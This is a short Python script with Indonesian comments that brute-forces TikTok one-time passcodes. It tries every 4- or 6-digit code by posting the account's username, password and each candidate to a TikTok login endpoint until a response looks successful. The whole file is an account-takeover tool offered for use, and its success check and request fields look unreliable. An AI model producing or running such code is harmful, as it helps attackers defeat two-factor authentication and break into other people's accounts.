import requests

def brute_force_otp(username, password, otp_length):
  """
  Fungsi ini melakukan brute force OTP untuk akun TikTok.

  Args:
    username: Username TikTok.
    password: Password TikTok.
    otp_length: Panjang OTP (biasanya 4 atau 6 digit).

  Returns:
    True jika OTP berhasil ditemukan, False jika tidak.
  """
  for otp in range(10**otp_length):
    # Format OTP dengan leading zeroes
    formatted_otp = f"{otp:0{otp_length}d}"

    # Siapkan payload data
    data = {
      "username": username,
      "password": password,
      "auth_type": "fb",
      "auth_token": formatted_otp
    }

    # Kirim permintaan login
    url = "https://api.tiktok.com/aweme/v1/user/login"
    response = requests.post(url, data=data)

    # Periksa status respons
    if response.status_code == 200:
      print(f"OTP ditemukan: {formatted_otp}")
      return True
    else:
      print(f"OTP gagal: {formatted_otp}")

  # OTP tidak ditemukan
  print("OTP tidak ditemukan.")
  return False

if __name__ == "__main__":
  username = input("Masukkan username TikTok: ")
  password = input("Masukkan password TikTok: ")
  otp_length = int(input("Masukkan panjang OTP (4 atau 6): "))

  brute_force_otp(username, password, otp_length)
